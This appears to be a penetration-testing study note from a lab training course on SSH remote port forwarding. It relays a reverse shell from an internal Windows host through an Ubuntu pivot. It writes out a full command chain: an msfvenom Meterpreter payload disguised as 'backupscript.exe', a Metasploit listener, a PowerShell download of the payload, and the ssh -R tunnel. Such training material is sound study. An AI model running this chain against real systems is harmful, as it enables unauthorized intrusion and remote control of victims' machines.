**When to use:** You have a foothold on an internal host (e.g. via RDP) but can't get a reverse shell directly back to your attack host — because the target has no route to your network.

---

## The Problem

```
Attack Host          Pivot Host (Ubuntu)       Windows Target
10.10.15.x    SSH    10.129.x.x                172.16.5.19
              ────►  172.16.5.129         ◄──── (internal only)
                     
Windows knows 172.16.5.0/23 only.
It has NO route to 10.10.15.x — reverse shell goes nowhere.
```

**Solution:** Make the pivot host relay the reverse shell back to you.

---

## How It Works

```
Windows ──► Ubuntu:8080 ──► (SSH tunnel) ──► Attack Host:8000 (MSF listener)
```

Payload connects to `172.16.5.129:8080` (Ubuntu).  
SSH forwards that to `0.0.0.0:8000` on your attack host.  
MSF listener catches it.

---

## Full Attack Chain

### Step 1 — Generate payload (points to pivot host, not your attack host)

bash

```bash
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=172.16.5.129 \
  LPORT=8080 \
  -f exe -o backupscript.exe
```

### Step 2 — Start MSF listener on attack host

bash

```bash
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost 0.0.0.0
set lport 8000
run
```

### Step 3 — Upload payload to pivot host

bash

```bash
scp backupscript.exe ubuntu@10.129.x.x:~/
```

### Step 4 — Serve payload from pivot host

bash

```bash
# on Ubuntu pivot host:
python3 -m http.server 8123
```

### Step 5 — Download payload on Windows target

powershell

```powershell
Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```

### Step 6 — Create the reverse SSH tunnel (run from attack host)

bash

```bash
ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@10.129.x.x -vN
```

> `-R` = remote forward  
> `-v` = verbose (see traffic in real time)  
> `-N` = no shell, just forward

### Step 7 — Execute payload on Windows

Run `C:\backupscript.exe` on the Windows target.  
Shell arrives at MSF on your attack host.

---

## -R Flag Syntax

bash

```bash
ssh -R <pivot_IP>:<pivot_port>:<your_IP>:<your_port> user@pivot_host
#        └─ where Windows connects    └─ where MSF listens
```

---

## Verify It's Working

In the SSH `-v` output you'll see:

```
client_request_forwarded_tcpip: listen 172.16.5.129 port 8080, originator 172.16.5.19 port XXXXX
channel 1: connected to 0.0.0.0 port 8000
```

MSF will show the session coming from `127.0.0.1` — that's expected (traffic arrives via local SSH socket).

---

## -L vs -R at a Glance

||`-L` Local|`-R` Remote|
|---|---|---|
|Direction|Pull remote service to you|Push your listener to pivot host|
|Who initiates|You → pivot → service|Target → pivot → you|
|Use case|Access internal service|Catch reverse shell through pivot|

---

## Tags

`#htb` `#cpts` `#pivoting` `#ssh` `#reverseShell` `#meterpreter` `#msfvenom`